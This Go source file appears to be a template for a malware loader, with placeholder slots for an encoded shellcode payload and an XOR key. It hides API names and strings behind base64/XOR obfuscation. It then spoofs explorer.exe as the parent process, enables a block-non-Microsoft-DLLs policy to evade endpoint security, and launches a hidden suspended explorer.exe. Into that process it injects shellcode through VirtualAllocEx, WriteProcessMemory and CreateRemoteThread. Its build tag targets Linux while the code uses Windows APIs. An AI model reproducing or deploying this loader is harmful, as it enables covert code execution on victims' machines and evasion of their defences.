// +build linux,amd64,go1.15,!cgo
package main

import (
	"encoding/base64"
	"errors"
	"log"
	"strings"
	"syscall"
	"unsafe"

	syscalls "./syscalls"
	"golang.org/x/sys/windows"
)

const (
	MEM_COMMIT                = 0x1000
	MEM_RESERVE               = 0x2000
	PAGE_EXECUTE_READWRITE    = 0x40
	PROCESS_CREATE_THREAD     = 0x0002
	PROCESS_QUERY_INFORMATION = 0x0400
	PROCESS_VM_OPERATION      = 0x0008
	PROCESS_VM_WRITE          = 0x0020
	PROCESS_VM_READ           = 0x0010
)

var (
	kernel32            = syscall.MustLoadDLL(bake("§kernel32.dll§"))
	virtualAllocEx      = kernel32.MustFindProc(bake("§VirtualAllocEx§"))
	writeProcessMemory  = kernel32.MustFindProc(bake("§WriteProcessMemory§"))
	openProcess         = kernel32.MustFindProc(bake("§OpenProcess§"))
	waitForSingleObject = kernel32.MustFindProc(bake("§WaitForSingleObject§"))
	createRemoteThread  = kernel32.MustFindProc(bake("§CreateRemoteThread§"))
	key                 = "§key§"
)

type windowsProcess struct {
	ProcessID       int
	ParentProcessID int
	Exe             string
}

func newWindowsProcess(e *syscall.ProcessEntry32) windowsProcess {
	end := 0
	for {
		if e.ExeFile[end] == 0 {
			break
		}
		end++
	}
	return windowsProcess{
		ProcessID:       int(e.ProcessID),
		ParentProcessID: int(e.ParentProcessID),
		Exe:             syscall.UTF16ToString(e.ExeFile[:end]),
	}
}

func findProcessByName(processes []windowsProcess, name string) *windowsProcess {
	for _, p := range processes {
		if strings.ToLower(p.Exe) == strings.ToLower(name) {
			return &p
		}
	}
	return nil
}

func processes() ([]windowsProcess, error) {
	handle, err := syscall.CreateToolhelp32Snapshot(0x00000002, 0)
	if err != nil {
		return nil, err
	}
	defer syscall.CloseHandle(handle)

	var entry syscall.ProcessEntry32
	entry.Size = uint32(unsafe.Sizeof(entry))
	err = syscall.Process32First(handle, &entry)
	if err != nil {
		return nil, err
	}
	results := make([]windowsProcess, 0, 50)
	for {
		results = append(results, newWindowsProcess(&entry))

		err = syscall.Process32Next(handle, &entry)
		if err != nil {
			if err == syscall.ERROR_NO_MORE_FILES {
				return results, nil
			}
			return nil, err
		}
	}
}

func writeShellcode(pid int, sc []byte) (uintptr, uintptr, int) {
	var f int = 0
	proc, _, _ := openProcess.Call(PROCESS_CREATE_THREAD|PROCESS_QUERY_INFORMATION|PROCESS_VM_OPERATION|PROCESS_VM_WRITE|PROCESS_VM_READ, uintptr(f), uintptr(pid))
	raddr, _, _ := virtualAllocEx.Call(proc, uintptr(f), uintptr(len(sc)), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)
	writeProcessMemory.Call(proc, raddr, uintptr(unsafe.Pointer(&sc[0])), uintptr(len(sc)), uintptr(f))
	return proc, raddr, f
}

func createRemoteThreadAndWait(proc uintptr, raddr uintptr, f int) error {
	crts, _, _ := createRemoteThread.Call(proc, uintptr(f), 0, raddr, uintptr(f), 0, uintptr(f))
	if crts == 0 {
		err := errors.New(bake("§[-] CreateRemoteThread Failed§"))
		return err
	}
	_, _, errWaitForSingleObject := waitForSingleObject.Call(proc, 0, syscall.INFINITE)
	if errWaitForSingleObject.Error() != bake("§The operation completed successfully.§") {
		return errors.New(bake("§[-] WaitForSingleObject Failed§"))
	}
	return nil
}

func main() {
	var encoded = "§shellcode§"
	var sc = polish(encoded)
	procThreadAttributeSize := uintptr(0)
	syscalls.InitializeProcThreadAttributeList(nil, 2, 0, &procThreadAttributeSize)
	procHeap, err := syscalls.GetProcessHeap()
	attributeList, err := syscalls.HeapAlloc(procHeap, 0, procThreadAttributeSize)
	defer syscalls.HeapFree(procHeap, 0, attributeList)
	var startupInfo syscalls.StartupInfoEx
	startupInfo.AttributeList = (*syscalls.PROC_THREAD_ATTRIBUTE_LIST)(unsafe.Pointer(attributeList))
	syscalls.InitializeProcThreadAttributeList(startupInfo.AttributeList, 2, 0, &procThreadAttributeSize)
	mitigate := 0x20007
	nonms := uintptr(0x100000000000)
	syscalls.UpdateProcThreadAttribute(startupInfo.AttributeList, 0, uintptr(mitigate), &nonms, unsafe.Sizeof(nonms), 0, nil)
	procs, err := processes()
	if err != nil {
		log.Fatal(err)
	}
	parentName := bake("§explorer.exe§")
	parentInfo := findProcessByName(procs, parentName)
	if parentInfo != nil {
		ppid := uint32(parentInfo.ProcessID)
		parentHandle, _ := windows.OpenProcess(windows.PROCESS_CREATE_PROCESS, false, ppid)
		uintParentHandle := uintptr(parentHandle)
		syscalls.UpdateProcThreadAttribute(startupInfo.AttributeList, 0, syscalls.PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &uintParentHandle, unsafe.Sizeof(parentHandle), 0, nil)

		var procInfo windows.ProcessInformation
		startupInfo.Cb = uint32(unsafe.Sizeof(startupInfo))
		startupInfo.Flags |= windows.STARTF_USESHOWWINDOW
		creationFlags := windows.CREATE_SUSPENDED | windows.CREATE_NO_WINDOW | windows.EXTENDED_STARTUPINFO_PRESENT
		programPath := bake("§c:\\windows\\explorer.exe§")
		utfProgramPath, _ := windows.UTF16PtrFromString(programPath)
		syscalls.CreateProcess(nil, utfProgramPath, nil, nil, true, uint32(creationFlags), nil, nil, &startupInfo, &procInfo)
		targetPid := int(procInfo.ProcessId)
		var proc, raddr, f = writeShellcode(targetPid, sc)
		createRemoteThreadAndWait(proc, raddr, f)
	}
}

func bake(cipher string) string {
	tmp, _ := base64.StdEncoding.DecodeString(cipher)
	_key, _ := base64.StdEncoding.DecodeString(key)
	baked := ""
	for i := 0; i < len(tmp); i++ {
		baked += string(tmp[i] ^ _key[i%len(_key)])
	}
	return baked
}

func polish(cipher string) []byte {
	tmp, _ := base64.StdEncoding.DecodeString(cipher)
	_key, _ := base64.StdEncoding.DecodeString(key)
	var polished []byte
	for i := 0; i < len(tmp); i++ {
		polished = append(polished, tmp[i]^_key[i%len(_key)])
	}
	return polished
}
